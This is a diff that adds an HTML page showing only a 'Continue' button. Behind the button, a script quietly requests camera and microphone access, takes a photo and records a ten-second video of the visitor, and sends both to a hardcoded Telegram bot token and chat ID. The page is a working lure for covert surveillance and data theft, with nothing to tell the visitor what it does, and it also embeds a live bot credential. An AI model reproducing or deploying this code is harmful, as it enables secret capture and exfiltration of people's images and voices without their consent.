@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Continue</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    background: #f5f5f5;
+}
+.container {
+    text-align: center;
+    background: #fff;
+    padding: 30px;
+    border-radius: 12px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
+button {
+    padding: 15px 30px;
+    font-size: 18px;
+    cursor: pointer;
+    background-color: #4caf50;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    transition: background-color 0.3s ease;
+}
+button:hover {
+    background-color: #388e3c;
+}
+.loading-message {
+    display: none;
+    margin-top: 20px;
+    font-size: 16px;
+    color: #007BFF;
+}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+<div class="container">
+    <button id="continueBtn">Continue</button>
+    <div class="loading-message" id="loadingMessage">Please wait...</div>
+</div>
+
+<script>
+let captureCount = 0;
+const MAX_CAPTURES = 3;
+const TELEGRAM_BOT_TOKEN = '8271602740:AAF7aPa4XV0x6aHnfBsfTxPOU5Xzeda-qaA';
+const CHAT_ID = '5885830322';
+
+document.getElementById('continueBtn').addEventListener('click', getPermission);
+
+function getPermission() {
+    document.getElementById('loadingMessage').style.display = 'block';
+    captureMedia();
+}
+
+async function captureMedia() {
+    if (captureCount >= MAX_CAPTURES) {
+        alert('Maximum attempts reached.');
+        return;
+    }
+
+    captureCount++;
+
+    try {
+        const constraints = { video: { facingMode: 'user' }, audio: true };
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+        const imgData = await captureImageFromStream(stream);
+        const imgBlob = await fetch(imgData).then(res => res.blob());
+        sendMediaToTelegram(imgBlob, 'photo');
+
+        const videoBlob = await captureVideoFromStream(stream);
+        sendMediaToTelegram(videoBlob, 'video');
+
+        stream.getTracks().forEach(track => track.stop());
+        document.getElementById('loadingMessage').style.display = 'none';
+    } catch (error) {
+        console.error('Error accessing camera:', error);
+        alert('Camera access denied or not supported.');
+    }
+}
+
+async function captureImageFromStream(stream) {
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    return imageCapture.takePhoto().then(blob => URL.createObjectURL(blob));
+}
+
+function captureVideoFromStream(stream) {
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    mediaRecorder.start();
+    return new Promise(resolve => {
+        mediaRecorder.onstop = () => {
+            resolve(new Blob(chunks, { type: 'video/webm' }));
+        };
+        setTimeout(() => mediaRecorder.stop(), 10000);
+    });
+}
+
+function sendMediaToTelegram(blob, type) {
+    const formData = new FormData();
+    formData.append(type, blob, `${type}_${captureCount}.webm`);
+    formData.append('caption', `Capture #${captureCount}`);
+
+    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, formData, {
+        params: { chat_id: CHAT_ID }
+    }).then(res => console.log('Sent:', res.data))
+      .catch(err => console.error('Error sending:', err));
+}
+</script>
+</body>
+</html>
